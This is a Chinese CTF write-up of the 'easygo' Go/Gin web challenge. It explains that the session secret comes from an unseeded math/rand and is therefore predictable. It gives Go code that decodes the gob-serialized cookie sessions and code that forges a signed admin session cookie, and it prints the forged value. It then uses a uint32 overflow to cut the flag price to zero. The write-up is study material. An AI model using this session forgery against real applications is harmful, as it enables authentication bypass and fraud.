---
创建: 2025-11-02
tags:
  - CTF/比赛/25/领航杯初赛/Web
---

# easygo  ^toc

- [[#easygo  ^toc|easygo]]
	- [[#1 `/auth/login` 路由|1 `/auth/login` 路由]]
	- [[#2 `/game` 路由|2 `/game` 路由]]
	- [[#3 `/play/` 路由|3 `/play/` 路由]]
		- [[#3.1 `/play/guess` 路由|3.1 `/play/guess` 路由]]
		- [[#3.2 `/play/add` 路由|3.2 `/play/add` 路由]]
	- [[#4 解题思路|4 解题思路]]
	- [[#5 `sessions` 探究|5 `sessions` 探究]]
	- [[#6 `math/rand` 特性|6 `math/rand` 特性]]
	- [[#7 解题|7 解题]]

这题给了源码包，让我们分析一下
![[领航杯复现-251102-212232.png]]

## 1 `/auth/login` 路由

图中第 `27` 行，把对根路由的请求重定向到 `/auth/login` 路由；于是就相当于直接访问第 `19` 行的路由。(其实会先执行第 `18` 行的处理函数 `hashProofRequired()()`，不过这个实际逻辑只对 `POST` 请求执行，这里先忽略)
![[领航杯复现-251102-212705.png]]

我们跟进 `loginGetHandler` 处理函数，它先是调用 `hashProof()` 生成 `hash` 并保存到 `hsh` 变量；接着调用 `s.Set("hsh", hsh)` 把它保存到 `sessions` 中；最后渲染模板，把 `hsh` 传递给模板显示。
![[领航杯复现-251102-213003.png]]

因此直接访问的话，会回显下面的页面
![[领航杯初赛复现-251104-134315.png]]

此页面的 html 模板如下，当点击提交时，其会发送三个数据：`uname` `pwd` 和 `hsh`，提交路由为 `/auth/login`
![[领航杯初赛复现-251104-134432.png]]

对于对 `/auth/` 路由组下的 `POST` 请求来说，会执行 `hashProofRequired()` 返回的处理函数，这个函数主要是判断我们表单提交的 `hsh` 原始值 `md5Hash` 后的前 `6` 位是否和 `hsh` 相等。
这相当于爆破出一个前六位符合要求的 `hash` 就可以了，还是很容易的；我比赛的时候是让 `ai` 帮忙生成一个 `md5` 后前六位符合要求的数据，不过实际上做这题用不到这一步。
![[领航杯初赛复现-251104-134605.png]]

通过 `hash` 校验后，就进入了 `login` 的逻辑，这里面的逻辑是把 `uname` 保存到 `sessions` 里面 (这里 `uname` 限制了不能为 `admin`)，然后重定向到 `/game` 路由。
![[领航杯初赛复现-251104-135215.png]]

## 2 `/game` 路由

`/game` 路由主要是初始化一下 `nowMoney` 和 `playerMoney` 的数据，保存到 `session` 中；另外，还会生成一份 `Aes` 加密版本的 `checkNowMoney` 和 `checkPlayerMoney` 用于之后校验数据。
然后，就是渲染 `game` 模板，显示页面。
![[领航杯初赛复现-251104-135929.png]]

页面长这样：
![[领航杯初赛复现-251104-140455.png]]

对于 `html` 模板长这样：
![[领航杯初赛复现-251104-140154.png]]

从中，我们可以看到，`playerMoney` 就是玩家现有金额；而 `nowPlayer` 则是购买 `flag` 需要的金额，但它这个名字起的不好。

然后界面上还有两个按钮，一个 `buyFlag` 对应 `/play/guess` 路由，用于购买 `flag`；
一个 `addPrice` 按钮，对应 `/play/add` 路由，用于增加 `nowMoney`，即增加 `flag` 的价格。

## 3 `/play/` 路由

对于 `/play/guess` 路由，需要 `sessions` 中 `uname` 有值；对于 `/play/add` 路由，需要 `sessions` 中 `uname` 为 `admin`，这里不再多说。
![[领航杯初赛复现-251104-141940.png]]

### 3.1 `/play/guess` 路由

`/play/guess` 中的主要逻辑就是从 `sessions` 中读取 `playerMoney` 和 `nowMoney` 并和 `check<PlayerMoney|NowMoney>` 解密后结果比较是否一致；
如果一致且 `playerMoney` 大于 `nowMoney`，就输出 `flag`；
![[领航杯初赛复现-251104-142343.png]]

### 3.2 `/play/add` 路由

`/play/add` 路由的作用就是获取表单提交的 `addMoney` 并增加到 `nowMoney` 中。
![[领航杯初赛复现-251104-142853.png]]

注意这里使用 `uint32` 来解析从 `sessions` 中读到的字符串，并且计算时也使用 `newMoney = uint32(u1) + uint32(u2)` 来计算，所以没法使用负数让 `nowMoney` 减少；
但是，我们可以用 `math.Pow(2, 32)` 减去原来的 `nowMoney` 作为 `addMoney`，让 `uint32` 类型的 `newMoney` 发生溢出，变为 `0`。

## 4 解题思路

分析到这，思路就很明显了。

1. 我们需要让 `sessions` 中的 `uname` 为 `admin`，使得能够访问 `/play/add` 路由
2. 在 `/play/add` 路由中，我们传入 `math.Pow(2, 32) - nowMoney` 的 `addMoney`，使得 `newMoney` 发生溢出变为 `0`
3. 然后在 `/play/guess`，我们就能以 `0` 的价格购买到 `flag` 了

但问题是第一步怎么过？在 `/auth/login` 中明确限制了 `uname` 不能为 `admin`
![[领航杯初赛复现-251104-144312.png]]

那这里我们肯定不能依赖 `/auth/login` 路由去设置 `sessions` 的 `uname` 字段。

## 5 `sessions` 探究

到这一步，我们思考的问题就是怎么通过其他手段改 `sessions`；这时候就会想到 `Gin` `sessions` 中间件对 `session` 的存储方式：
如果存储在服务端，那我们很难更改 `session`；但如果它存储客户端，那我们就有操作的余地。

所以我们就要探究一下 `session` 的存储方式。

下面代码很明显，用的是 `cookie` 的存储方式：
![[领航杯初赛复现-251104-135540.png]]

然后实际看 `cookie` 里确实有 `name` 为 `o` 的键值对
![[领航杯初赛复现-251104-135656.png]]

虽然很多框架都喜欢把 `session` 用 `token` 的机制存储，也见怪不怪了；但这里还是要怀疑一下是不是存的 `session_id` 而不是数据的内容。

不过看它这段 `cookie` 是 `base64` 编码的形式就大概能猜出这不是 `session_id` 了；

而且 `sessions` 中间件 `github` 上的 [源码仓库](https://github.com/gin-contrib/sessions) 的 `README` 也列举了好几种存储方式，除了 `cookie` 还有数据库、文件系统等方式，这么一对比它这里 `cookie` 存储方式的 `session` 就是 `token` 那套机制没跑了，是把数据存储在客户端的。
![[领航杯初赛复现-251104-193917.png]]

不过我出于好奇还是验证了一下。

首先，我们看看上述那串 `base64` 解码后长啥样：
![[领航杯初赛复现-251104-194740.png]]

除了能明显看出三个 `|` 分隔的结构外，看不出其他什么；
然后我去网上搜了一下，但没搜到相关的论述；去看了官方文档，里面也没找到相关的论述。
其实如果问 `ai` 的话能够比较容易地得到答案，但不用问也知道 `ai` 说的肯定语焉不详，不利于理解。

所以不如自己去看源码。

我们自己写这样一个测试代码，然后在第 `16` 行打个断点
![[领航杯初赛复现-251104-195708.png]]

这里就是设置一下服务器内存中的 `session` `value`，还没有保存。
![[领航杯初赛复现-251104-201216.png]]

下一步是 `s.Save()` 保存操作，下面截图第 `118` 行调用了 `s.Session().Save`，我们跟进去看看
![[领航杯初赛复现-251104-201504.png]]

这一步把请求对象 `r`，响应对象 `w` 和 `session` 对象 `s` 作为参数调用了 `s.store.Save(r, w, s)`，我们继续跟进去
![[领航杯初赛复现-251104-201634.png]]

跟进去后，注意看 `104` 行，调用 `securecookie.EncodeMulti` 对之前保存到内存中的 `session` 进行编码，然后第 `109` 行使用 `http.SetCookie` 发送 `cookie` 到前端。到这里，已经可以肯定数据是存储在前端的了，现在的任务是确认存储的结构。
![[领航杯初赛复现-251104-201825.png]]

这时候，我们可以在左侧调试窗口看看 `session` 在内存中的结构，可以看到确实是保存了我们之前代码设置的数据的。
![[领航杯初赛复现-251104-202141.png]]

我们继续往里面跟，可以看到下面第 `569` 行，把 `name`(`session` 的名字 `session1`) 和 `value`(`session` 内容的键值对，其实是 `map[any]any` 类型的数据，例子中存储了 `name:LiSi`) 作为参数，传入 `codec.Encode` 进行编码，然后返回的 `encoded` 作为结果返回，然后被之前的 `http.SetCookie` 返回给前端。
![[领航杯初赛复现-251104-202404.png]]

这个 `codec.Encode` 里面就是 `session` 数据具体的编码方式了
![[领航杯初赛复现-251104-212510.png]]

这段代码给的注释已经很清晰了，简单来说，就是：
1. 先序列化 `value` 并 `base64` 编码
2. 然后如果 `cookie.NewStorage` 时有传第二个参数，那就再执行加密的逻辑；
3. 再之后是 `name|date|value` 的 `hash`
4. 最后，以 `date|value|hash` 的形式拼接到一块，然后再 `base64` 编码一次，得到作为 `cookie` 键值对值的部分的最终结果。

因此，如果我们想看到我们设置的 `s.Set("name", "LiSi")`，就需要对下图中选中的部分先 `base64` 解码，然后再执行反序列化。
![[领航杯初赛复现-251104-213727.png]]

那么，现在的问题是，它是如何序列化的？以及我们该如何对它反序列化？让我们来跟入前面源码中 `s.sz.Serialize(value)` 的内部。

然后很容易找到这两段序列化和反序列化的逻辑，它其实就是用的 `gob` 来序列化的；问题解决。
![[领航杯初赛复现-251104-214218.png]]

然后用 `gob` 反序列化我们还要知道原始数据的类型。

找到 `Session` 结构体的定义，看到 `Values` 字段的类型为 `map[interface{}]interface{}`
![[领航杯初赛复现-251104-214402.png]]

那我们很容易编写出反序列化逻辑

```go
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"strings"
)

func main() {
	var cookieValueBase64 string = "MTc2MjI2NDY0NXxEdi1CQkFFQ180SUFBUkFCRUFBQUl2LUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBWUFCRXhwVTJrPXw_6AnOALa7rgWz9NWLghgVa6_sJF0ZlJUOdicjm1nBiw=="
	layer1, _ := base64.URLEncoding.DecodeString(cookieValueBase64)
	layer2 := strings.Split(string(layer1), "|")[1]
	layer3, _ := base64.URLEncoding.DecodeString(layer2)
	res := make(map[interface{}]interface{})

	dec := gob.NewDecoder(bytes.NewBuffer(layer3))
	if err := dec.Decode(&res); err != nil {
		panic(err)
	}
	fmt.Println(res)
}
```

运行之后可以看到确实解出来我们设置的值 `name:LiSi`
![[领航杯初赛复现-251104-220144.png]]

到这就能得出结论，没有在 `cookie.NewStorage` 这设置第二个密钥的 `cookie` 存储模式的 `sessions`，其实就是 `token` 那套：数据是明文存储的，但有签名防止篡改。

## 6 `math/rand` 特性

回到前面解题的部分，如果我们想要篡改 `session` 中的 `uname`，我们就得知道题目中传入 `cookie.NewStorage` 的密钥；然后用同样的密钥对篡改过的数据进行签名，这样才能通过后端的验证。

现在让我们回到题目源码，可以看到它是调用 `randomChar(16)` 生成密钥的
![[领航杯初赛复现-251104-221049.png]]

跟进去，会发现它是用的 `rand.Read(output)` 生成有 `16` 个随机数的 `byte` 序列；
![[领航杯初赛复现-251104-221125.png]]

并且用的是 `math/rand`；
![[领航杯初赛复现-251104-221236.png]]

这时候要想到随机数种子的问题，我们写一个 `rand.Seed` 出来，然后鼠标移到它上面，看它的说明，里面写了如果没有调用这个函数设置随机数种子，那么将默认设为 `1`
![[领航杯初赛复现-251104-221758.png]]

种子相同，每次运行生成的随机数序列自然也是对应相等的；这里我们写代码测试多次，也确实是这样的。
![[领航杯初赛复现-251104-222056.png]]

到这里，`session` 的内容我们就可以随意更改了。接下来就是按照之前说的解题步骤一步步解就行了。

## 7 解题

写出下面的代码，用于生成符合我们要求的 `cookie`

```go
package main

import (
	"math/rand"

	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()
	storage := cookie.NewStore(func() []byte {
		p := make([]byte, 16)
		rand.Read(p)
		return p
	}())
	r.Use(sessions.Sessions("o", storage))

	r.GET("/", func(c *gin.Context) {
		s := sessions.Default(c)
		s.Set("uname", "admin")
		s.Save()
		c.String(200, "hello")
	})

	r.Run(":83")
}
```

运行上面的代码，访问它的地址，获取到 `cookie`
![[领航杯初赛复现-251104-222541.png]]

```
MTc2MjI2NjMyNXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQWNBQlhWdVlXMWxCbk4wY21sdVp3d0hBQVZoWkcxcGJnPT182eVjDr8Ou-Mb636bElRaWAYHe96oJX66x3EsQysKI6s=
```

然后生成一个可以使 `newMoney` 发生 `int32` 整数溢出的数值：

```go
fmt.Println(
	int(math.Pow(2, 32) - 200000),
)
```

```
4294767296
```

然后把浏览器 `cookie` 设为上面生成的，`addMoney` 填 `4294767296`
![[领航杯初赛复现-251104-223428.png]]

点击按钮 `addPrice` 后再刷新，`flag` 价格成功变为 `0`
![[领航杯初赛复现-251104-223450.png]]

最后购买到 `flag`
![[领航杯初赛复现-251104-223539.png]]
